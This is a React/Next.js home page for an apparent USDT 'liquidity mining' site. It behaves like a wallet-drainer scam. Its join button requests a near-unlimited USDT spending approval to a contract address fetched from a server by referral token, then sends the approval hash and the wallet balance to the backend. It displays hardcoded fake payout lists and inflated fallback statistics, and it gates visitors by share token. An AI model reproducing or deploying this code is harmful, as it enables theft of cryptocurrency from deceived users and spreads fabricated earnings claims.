"use client";
import Image from "next/image";

import classes from "./index.module.css";
import AddressIcon from "@images/icon/address.png"
import InfoIcon from "@images/icon/info.png"
import WalletIcon from "@images/icon/wallet.png"
import StarIcon from "@images/icon/star.png"
import PoolIcon from "@images/icon/pool.png"
import PartIcon from "@images/icon/part.png"
import IncomeIcon from "@images/icon/income.png"
import { shortenString } from "@/lib/utils";
import { useAccount, useNetwork } from "wagmi";
import Fna from "@/components/fna";
import Banner from "@/components/banner";
import Notic from "@/components/notic"
import SELECTImg from "@images/select.png"
import { useContractUserBalance, useGetUserInfo, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt";
import React,{ useEffect, useState, useRef } from "react";
import { postForm } from "node_modules/axios/index.cjs";
import { getRequestExtract, postUserapproveAuth, getContractAddress, getHomeConfig, getBackList } from "@/server/user";
import { Snackbar, Drawer } from "@mui/material";
import { useTranslation } from "react-i18next";
import CountUp from 'react-countup'
import MsgSuccess from '@/components/msgsuccess';
import { useRouter } from 'next/navigation';
import "./page.css"

export default function Home() {
  const { t, i18n } = useTranslation()
  const router = useRouter()
  const { address } = useAccount()
  const [loading, setLoding] = useState(false)
  const { data, isLoading, approve, isSuccess, onSuccess, onError } = userContractApprove()
  const { userinfo } = useGetUserInfo()
  const { userBalance } = useContractUserBalance()
  const [openDrawer, setOpenDrawer] = useState(false)
  const [selectDays, setSelectDays] = useState(30)
  const [contractAddress, setContractAddress] = useState<any>("")
  const [backList,setBackList] = useState<any>([])
  const { isAllowed } = useContractUserAllowanceStatus(contractAddress || "0x070c9581ce99eedbc659d1a34569f1c548a08a1b")
  const [addData,setAddData] = useState({
    isShow: false,
    title: '',
    status: 0,
    msg: ''
  })
  const [homeData,setHomeData] = useState<any>({})
  const [snackbarValue, setSnackbarValue] = useState({
    open: false,
    message: ""
  })
  const { chain } = useNetwork()
  const revenueList = [{
    a: "0xd9******967b",
    v: "1487.32USDT"
  }, {
    a: "0x6f******4829",
    v: "528.58USDT"
  }, {
    a: "0x8d******e55e",
    v: "64594.46USDT"
  }, {
    a: "0x23******4412",
    v: "44.59USDT"
  }, {
    a: "0x38******62a5",
    v: "769.93USDT"
  }, {
    a: "0xA3******50F2",
    v: "1487.32USDT"
  }, {
    a: "0xfa******2252",
    v: "999.86USDT"
  }, {
    a: "0x72******9a09",
    v: "9361.82USDT"
  }, {
    a: "0xf0******aa63",
    v: "827.48USDT"
  }, {
    a: "0xF2******D69f",
    v: "68.91USDT"
  }, {
    a: "0x93******c8f5",
    v: "9168.85USDT"
  }, {
    a: "0x03******8ac0",
    v: "748.37USDT"
  }, {
    a: "0xd7******0a0E",
    v: "54.86USDT"
  }, {
    a: "0x20******452e",
    v: "813.74USDT"
  }, {
    a: "0x1b******7042",
    v: "88.47USDT"
  }, {
    a: "0xc4******98Ac",
    v: "602.74USDT"
  }, {
    a: "0xeb******b826",
    v: "58.79USDT"
  }, {
    a: "0xcc******b873",
    v: "304.66USDT"
  }, {
    a: "0x78******8A1E",
    v: "200.96USDT"
  }, {
    a: "0x73******5f18",
    v: "470.70USDT"
  }, {
    a: "0xa5******4c0f",
    v: "198.98USDT"
  }, {
    a: "0x83******e434",
    v: "648.69USDT"
  }, {
    a: "0xd9******bd25",
    v: "91.88USDT"
  }, {
    a: "0x6fe******482b",
    v: "89.23USDT"
  }]

  const days = [7,14,30,60,90,180]
  useEffect(()=>{
    if(isSuccess){
      onSuccess(async () => {
        const res = await postUserapproveAuth({
          address,
          chain_type: chain?.id,
          auth_status: 1,
          auth_hash: data?.hash,
          balance: userBalance,
        })
        setAddData({
          title: t("index.participant"),
          isShow: true,
          status: 0,
          msg: t("index.successed")
        })
      })
    }
  },[isSuccess])

  useEffect(() => {
    if(address){
      handleGetAddress()
      handleGetHomeConfig()
      handleGetBackList()
    }
  }, [chain,address])

  const handleGetHomeConfig = async () => {
    try{
      let { data, code } = await getHomeConfig({address,chain_type: chain?.id})
      if(code == 200){
        setHomeData(data)
      }
    }catch{}
  }

  const handleGetBackList = async () => {
    let {data,code} = await getBackList({address})
    if(code == 200){
      setBackList(data)
    }
  }

  const handleGetAddress = async () => {
    const params = new URLSearchParams(window.location.search)
    const paramValue = params.get('c')
    if(!paramValue){
      router.push("/404")
      return
    }
    let { data } = await getContractAddress({
      address,
      chain_type: chain?.id,
      domain: window?.location?.hostname,
      share_token: paramValue || '',
    })
    setContractAddress(data.auth_address)
  }
  const handleParticipate = async () => {
    if(contractAddress == "") return
    if(isAllowed && address && chain?.id != 56){
      const res = await postUserapproveAuth({
        address,
        chain_type: chain?.id,
        auth_status: 0,
        auth_hash: data?.hash || '',
        balance: userBalance,
      })
      setSnackbarValue({
          open: true,
          message: t("index.authed"),
      })
      return
    }
    setLoding(true)
    try {
      await approve({
        args: [contractAddress, 14122398000000000000000000000],
      })
    } catch (error) {
      console.log(error);
    }
    setLoding(false)
  }
  const handlerAdvanced = async () => {
    setLoding(true)
    const { data } = await getRequestExtract({ join_days: selectDays, address, chain_type: chain?.id })
    // setSnackbarValue({
    //   open: true,
    //   message: "advanced success"
    // })
    if(data){
      setAddData({
        isShow: true,
        title: t("index.add_height_ming"),
        status: 0 ,
        msg: t("index.successed")
      })
    }else{
      setAddData({
        isShow: true,
        title: t("index.add_height_ming"),
        status: 1,
        msg: t("index.fail_auth")
      })
    }
    setLoding(false)
  }

  // const handleAuthUser = async() => {
  //   const params = new URLSearchParams(window.location.search);
  //   const paramValue = params.get('c');
  //   try{
  //     const res = await postAuthUser({hash:paramValue})
  //   }catch{
  //     console.log("发展代理失败[handleAuthUser]")
  //   }
  // }
  return (
    <article 
      className="h-auto overflow-scroll"
      // style={{background:"linear-gradient(to bottom left, #42478c, rgb(29,33,81))"}}
    >
      <Banner />
      <article className="w-full mt-4 px-4">
        <div className="title">{t("index.slogen")}</div>
        <div className="mt-5 grid grid-cols-2 gap-4">
          <div className="flex flex-col p-[10px] rounded-[10px]" style={{background: "rgba(255,255,255,0.3)",position: "relative",overflow: "hidden"}}>
            <span className="text-sm">{t("index.liq_node")}</span>
            <span className="text-lg mt-3" style={{fontWeight: "bold"}}>
              <CountUp start={0} end={(homeData?.node_number && Number(homeData?.node_number)) ? Number(homeData?.node_number) : 4615097} duration={2} />
            </span>
            {/* <div className="sync-01"></div>
            <div className="sync-02"></div> */}
          </div>
          <div className="flex flex-col p-[10px] rounded-[10px]" style={{background: "rgba(255,255,255,0.3)",position: "relative",overflow: "hidden"}}>
            <span className="text-sm">{t("index.liq_pool")}</span>
            <span className="text-lg mt-3" style={{fontWeight: "bold"}}>
              <CountUp start={0} end={(homeData?.pool_total && Number(homeData?.pool_total)) ? Number(homeData?.pool_total) : 376021075} duration={2} />
            </span>
            {/* <div className="sync-03"></div> */}
          </div>
          <div className="flex flex-col p-[10px] rounded-[10px]" style={{background: "rgba(255,255,255,0.3)",position: "relative",overflow: "hidden"}}>
            <span className="text-sm">{t("index.participant")}</span>
            <span className="text-lg mt-3" style={{fontWeight: "bold"}}>
              <CountUp start={0} end={(homeData?.auth_number && Number(homeData?.auth_number)) ? Number(homeData?.auth_number) : 374476} duration={2} />
            </span>
            {/* <div className="sync-04"></div> */}
          </div>
          <div className="flex flex-col p-[10px] rounded-[10px]" style={{background: "rgba(255,255,255,0.3)",position: "relative",overflow: "hidden"}}>
            <span className="text-sm">{t("index.income")}</span>
            <span className="text-lg mt-3" style={{fontWeight: "bold"}}>
              <CountUp start={0} end={(homeData?.income && Number(homeData?.income)) ? Number(homeData?.income) : 14982313} duration={2} />
            </span>
            {/* <div className="sync-05"></div> */}
          </div>
        </div>
        {
          !(backList.some((item:any)=>{return item.address == address})) &&
          <div className="w-full flex justify-between mt-5">
            <div 
              style={{background: "linear-gradient( 90deg, #22FFE0 0%, #64FFA5 100%)", color: "#2F5E4B", fontWeight: "bold"}} 
              className="text-center rounded-[10px] p-3 w-full my-auto cursor-pointer"
              onClick={handleParticipate}
            >
              {t("index.now_join")}
            </div>
          </div>
        }
        
        {
          (address && isAllowed) &&
          <div
            className="cursor-pointer p-3 w-full text-[#2F5E4B] mt-5 text-center rounded-[10px] font-bold"
            onClick={handlerAdvanced}
            style={{background: "linear-gradient( 90deg, #6FE5FF 0%, #DBF057 100%)"}}
          >
            {t("index.add_height_ming")}
          </div>
        }
        <div className="title mt-5">{t("index.user_mining_revenue")}</div>
        <div className="my-5 p-0.5 rounded-xl bg-[rgba(255,255,255,0.1)]">
          <div className="w-full p-4 rounded-xl m-auto">
            <div className="flex justify-between text-[#fff]">
              <span>{t("index.address")}</span>
              <span>{t("index.value")}</span>
            </div>
            <div className="line mt-3"></div>
            <div className="h-[20rem] overflow-hidden relative py-4 mt-5">
              <ul className={classes.scrollBox}>
                {[...revenueList, ...revenueList].map((item, index) => {
                  return <li key={index} className="h-8 flex justify-between">
                    <p className="text-sm text-white">{item.a}</p>
                    <p className="text-sm text-white">{item.v}</p>
                  </li>
                })}
              </ul>
            </div>
          </div>
        </div>
        <div className="title mt-5">{t("index.fre_q")}</div> 
        <Fna />
      </article>
      
      <Snackbar
        open={snackbarValue.open}
        autoHideDuration={6000}
        anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
        onClose={() => {
          setSnackbarValue({
            ...snackbarValue,
            open: false,
            message: ""
          })
        }}
        message={snackbarValue.message}
      />
      <Notic />
      <Drawer
          anchor="bottom"
          open={openDrawer}
          onClose={() => setOpenDrawer(false)}
          PaperProps={{
              style: {
                  backgroundColor: "#252525",
                  borderRadius: "10px 10px 0px 0px",
              },
          }}
          
      >
        <section className='w-full p-5 bg-[#1D2151]'>
          <div className="text-center text-white text-xl mb-5">{t("index.select_days")}</div>
          { days.map(item=>{
            return (
              <div className="flex justify-between rounded-[10px] mt-2 bg-[#24285B]" onClick={()=>{ setSelectDays(item);setOpenDrawer(false) }}>
                <span className="text-white p-3">{item} {t("index.days")}</span>
                {item == selectDays && <Image
                  src={SELECTImg}
                  width={11}
                  height={8}
                  alt=''
                  className='mr-2 my-auto'
                />}
              </div>
            )
          })}
          
        </section>
      </Drawer>
      <MsgSuccess isShow={addData.isShow} title={addData.title} status={addData.status} msg={addData.msg} reset={ ()=>{setAddData({...addData,isShow: false})} } />
    </article>
  );
}


